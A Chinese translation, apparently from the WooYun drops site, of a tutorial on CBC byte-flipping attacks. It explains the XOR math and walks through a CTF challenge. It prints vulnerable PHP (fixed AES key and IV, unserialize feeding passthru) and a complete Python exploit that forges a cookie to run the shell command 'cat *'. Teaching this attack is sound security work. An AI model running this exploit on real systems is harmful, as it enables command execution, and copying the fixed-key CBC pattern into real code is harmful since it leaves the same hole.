@@ -1,0 +1,169 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CBC字节翻转攻击-101Approach</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Larry</a> <span class="bull">·</span> <time title="2015/08/14 16:36" ui-time="" datetime="2015/08/14 16:36" class="published ng-binding ng-isolate-scope">2015/08/14 16:36</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 译者前言</h1><hr><p>本文翻译自：<a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a></p><p>drops里的相关主题文章：<a href="http://drops.wooyun.org/tips/4975">使用CBC比特反转攻击绕过加密的会话令牌</a></p><p>缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。</p><h1>0x01 相关介绍</h1><hr><p>此攻击方法的精髓在于：<strong>通过损坏密文字节来改变明文字节</strong>。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p><p>首先让我们看看CBC是如何工作的，（作者很懒所以）更多细节你可以看这里：<a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">wiki</a></p><p>在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）</p><p><strong>加密过程</strong></p><p><img alt="enter image description here" img-src="016921e74bbeb0584b7050ea0323d6db4023ac4a.jpg"></p><p><strong>Plaintext</strong>：待加密的数据。</p><p><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p><strong>Key</strong>：被一些如AES的对称加密算法使用。</p><p><strong>Ciphertext</strong>：加密后的数据。</p><p>在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。在本文中，我们将使用包含16字节的块。</p><p>因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：</p><ul><li><em>Ciphertext-0 = Encrypt(Plaintext XOR IV)</em>—只用于第一个组块</li><li><em>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</em>—用于第二及剩下的组块</li></ul><p>注意：正如你所见，<strong>前一块的密文用来产生后一块的密文</strong>。</p><p><strong>Decryption Process</strong></p><p><img alt="enter image description here" img-src="b597d6474d286cb7f67d4f0df7ba85ba024c9025.jpg"></p><ul><li><em>Plaintext-0 = Decrypt(Ciphertext) XOR IV</em>—只用于第一个组块</li><li><em>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</em>—用于第二及剩下的组块</li></ul><p>注意：<strong><em>Ciphertext-N-1</em>（密文-N-1）是用来产生下一块明文</strong>；这就是字节翻转攻击开始发挥作用的地方。如果我们改变<em>Ciphertext-N-1</em>（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！<strong>You got it?</strong>别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：</p><p><img alt="enter image description here" img-src="157b4078de6a8615e7c4be958d4d89164f1810e9.jpg"></p><h1>0x02 一个例子（CBC Blocks of 16 bytes）</h1><hr><p>比方说，我们有这样的明文序列：</p><p><code>a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}</code></p><p>我们的目标是将“<code>s:6</code>”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p><ul><li>Block 1:<code>a:2:{s:4:"name";</code></li><li>Block 2:<code>s:6:"sdsdsd";s:8</code></li><li>Block 3:<code>:"greeting";s:20</code></li><li>Block 4:<code>:"echo 'Hello sd</code></li><li>Block 5:<code>sdsd!'";}</code></li></ul><p>因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。</p><p>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，<strong>只</strong>会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：</p><ul><li>[0] = s</li><li><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/115.png">1</a> = :</li><li><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/216.png">2</a> =6</li></ul><p>因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><ol><li><code>$v = "a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}";</code></li><li><code>$enc = @encrypt($v);</code></li><li><code>$enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));</code></li><li><code>$b = @decrypt($enc);</code></li></ol><p>运行这段代码后，我们可以将数字6变为7：</p><p><img alt="enter image description here" img-src="a75845cbf1166e1cb36877f0c84ad28f5359df85.jpg"></p><p>但是我们在第3行中，是如何改变字节成为我们想要的值呢？</p><p>基于上述的解密过程，我们知道有，<em>A = Decrypt(Ciphertext)</em>与<em>B = Ciphertext-N-1</em>异或后最终得到<em>C = 6</em>。等价于：</p><pre><code>C = A XOR B
+</code></pre><p>所以，我们唯一不知道的值就是A（注：对于B，C来说）（<em>block cipher decryption</em>）;借由XOR，我们可以很轻易地得到A的值：</p><pre><code>A = B XOR C
+</code></pre><p>最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：</p><p><code>A XOR B XOR C XOR "7"</code>会在块2的明文当中，偏移量为2的字节处得到7。</p><p>下面是相关原理实现的PHP源代码：</p><pre><code>#!php
+define('MY_AES_KEY', "abcdef0123456789");
+function aes($data, $encrypt) {
+    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+    $iv = "1234567891234567";
+    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);
+}
+
+define('MY_MAC_LEN', 40);
+
+function encrypt($data) {
+    return aes($data, true);
+}
+
+function decrypt($data) {
+    $data = rtrim(aes($data, false), "\0");
+    return $data;
+}
+$v = "a:2:{s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";}";
+echo "Plaintext before attack: $v\n";
+$b = array();
+$enc = array();
+$enc = @encrypt($v);
+$enc[2] =  chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));
+$b = @decrypt($enc);
+echo "Plaintext AFTER attack : $b\n";
+</code></pre><h1>0x03 一个练习</h1><hr><p>光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。</p><p>下面提供了这个练习当中很重要的一部分源码：</p><p><img alt="enter image description here" img-src="4be3a59aa623337a6c329a4606a2c246ee524b52.jpg"></p><p>其中，你在POST提交参数"name"的任何文本值之后，应用程序则会对应输出"Hello"加上最后提交的文本。但是有两件事情发生在消息打印之前：</p><ol><li>POST参数"name"值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array->greeting当中，最后加密该值来产生cookie。</li><li>Array->greeting当中的内容被PHP函数passthru()执行。</li><li>最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。</li></ol><p>然后作者构造了一个POST"name"的值来注入字符串：</p><pre><code>name = 'X' + ';cat *;#a'
+</code></pre><p>首先作者添加了一个字符"X"，通过CBC翻转攻击将其替换成一个单引号，然后<code>;cat *;</code>命令将被执行，最后的<code>#</code>是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。</p><p>在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：</p><pre><code>pos = 51;
+val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]
+</code></pre><p>然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：</p><p><img alt="enter image description here" img-src="a307d3d11ed50b0f3b36d6d031295be4adbb4b10.jpg"></p><p>首先，因为我们改变了第一块，所以在第二块中，黄色标记的"X"被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。</p><p><strong>如何完善</strong></p><p>我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个'z'：</p><pre><code>name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16
+</code></pre><p>在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！</p><h1>0x04 相关参考</h1><hr><ol><li>CRYPTO #2: <a href="http://blog.gdssecurity.com/labs/tag/crypto">http://blog.gdssecurity.com/labs/tag/crypto</a></li><li><a href="http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/">http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</a></li><li><a href="http://hardc0de.ru/2013/08/04/ebctf-web400/">http://hardc0de.ru/2013/08/04/ebctf-web400/</a></li></ol><h1>0x05 附录代码</h1><hr><p>下面是上面练习当中的PHP源码及exp：</p><p><strong>PHP code:</strong></p><pre><code>#!php
+ini_set('display_errors',1);
+error_reporting(E_ALL);
+
+define('MY_AES_KEY', "abcdef0123456789");
+define('MY_HMAC_KEY',"1234567890123456" );
+#define("FLAG","CENSORED");
+
+function aes($data, $encrypt) {
+$aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
+$iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);
+$iv = "1234567891234567";
+mcrypt_generic_init($aes, MY_AES_KEY, $iv);
+return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);
+}
+
+define('MY_MAC_LEN', 40);
+
+function hmac($data) {
+return hash_hmac('sha1', data, MY_HMAC_KEY);
+}
+
+function encrypt($data) {
+return aes($data . hmac($data), true);
+}
+
+function decrypt($data) {
+$data = rtrim(aes($data, false), "\0");
+$mac = substr($data, -MY_MAC_LEN);
+$data = substr($data, 0, -MY_MAC_LEN);
+return hmac($data) === $mac ? $data : null;
+}
+$settings = array();
+if (@$_COOKIE['settings']) {
+echo @decrypt(base64_decode($_COOKIE['settings']));
+$settings = unserialize(@decrypt(base64_decode($_COOKIE['settings'])));
+}
+if (@$_POST['name'] &amp;&amp; is_string($_POST['name']) &amp;&amp; strlen($_POST['name']) &lt; 200) {
+$settings = array(
+'name' =&gt; $_POST['name'],
+'greeting' =&gt; ('echo ' . escapeshellarg("Hello {$_POST['name']}!")),
+);
+setcookie('settings', base64_encode(@encrypt(serialize($settings))));
+#setcookie('settings', serialize($settings));
+}
+$d = array();
+if (@$settings['greeting']) {
+passthru($settings['greeting']);
+else {
+echo "&lt;/pre&gt;
+&lt;form action="\&amp;quot;?\&amp;quot;" method="\&amp;quot;POST\&amp;quot;"&gt;\n";
+echo "
+What is your name?
+
+\n";
+echo "&lt;input type="\&amp;quot;text\&amp;quot;" name="\&amp;quot;name\&amp;quot;" /&gt;\n";
+echo "&lt;input type="\&amp;quot;submit\&amp;quot;" name="\&amp;quot;submit\&amp;quot;" value="\&amp;quot;Submit\&amp;quot;" /&gt;\n";
+echo "&lt;/form&gt;
+&lt;pre&gt;
+\n";
+}
+?&gt;
+</code></pre><p><strong>Exploit:</strong></p><pre><code>#!python
+#!/usr/bin/python
+import requests
+import sys
+import urllib
+from base64 import b64decode as dec
+from base64 import b64encode as enc
+
+url = 'http://192.168.184.133/ebctf/mine.php'
+
+def Test(x):
+    t = "echo 'Hello %s!'" % x
+    s = 'a:2:{s:4:"name";s:%s:"%s";s:8:"greeting";s:%s:"%s";}%s' % (len(x),x,len(t),t, 'X'*40)
+    for i in xrange(0,len(s),16):
+        print s[i:i+16]
+    print '\n'
+
+def Pwn(s):
+    global url
+    s = urllib.quote_plus(enc(s))
+    req = requests.get(url, cookies = {'settings' : s}).content
+ #   if req.find('works') != -1:
+    print req
+  #  else:
+   #     print '[-] FAIL'
+
+def GetCookie(name):
+    global url
+    d = {
+        'name':name,
+        'submit':'Submit'
+    }
+    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
+    if h.has_key('set-cookie'):
+        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
+        #h = urllib.unquote_plus(h['set-cookie'][9:])
+        #print h
+        return h
+    else:
+        print '[-] ERROR'
+        sys.exit(0)
+
+#a:2:{s:4:"name";s:10:"X;cat *;#a";s:8:"greeting";s:24:"echo 'Hello X;cat *;#a!'";}
+#a:2:{s:4:"name";
+#s:10:"X;cat *;#a
+#";s:8:"greeting"
+#;s:24:"echo 'Hel
+#lo X;cat *;#a!'"
+#;}
+
+#a:2:{s:4:"name";s:42:"zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz";s:8:"greeting";s:56:"echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'";}
+#a:2:{s:4:"name";
+#s:42:"zzzzzzzzzz
+#zzzzzzzX;cat *;#
+#zzzzzzzzzzzzzzzz
+#";s:8:"greeting"   
+#;s:56:"echo 'Hel
+#lo zzzzzzzzzzzzz
+#zzzzX;cat *;#zzz
+#zzzzzzzzzzzzz!'"
+#;}
+#exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
+exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success
+
+#exploit = "______________________________________________________; cat *;#"
+#Test(exploit)
+cookie = GetCookie(exploit)
+pos = 100; #test case success
+#pos = 51; #test case first, unsuccess
+val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]
+Pwn(exploit)
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3170" rel="bookmark" id="re1">ISG2014 Writeups</a></li><li><a href="http://drops.wooyun.org/papers/4834" rel="bookmark" id="re2">RansomWeb:一种新兴的web安全威胁</a></li><li><a href="http://drops.wooyun.org/tips/4403" rel="bookmark" id="re3">常见的HTTPS攻击方法</a></li><li><a href="http://drops.wooyun.org/tips/6042" rel="bookmark" id="re4">正确地使用加密与认证技术</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">retanoj</span> <span class="reply-time">2015-08-17 13:38:33</span></div><p></p><p>@Dodd 损坏的块会解出乱码，其余的会正常解密。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2015-08-14 18:29:59</span></div><p></p><p>![](static/drops/full/016921e74bbeb0584b7050ea0323d6db4023ac4a.jpg)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-08-14 18:15:26</span></div><p></p><p>good</p><p></p></div></div></div></div></div></main>
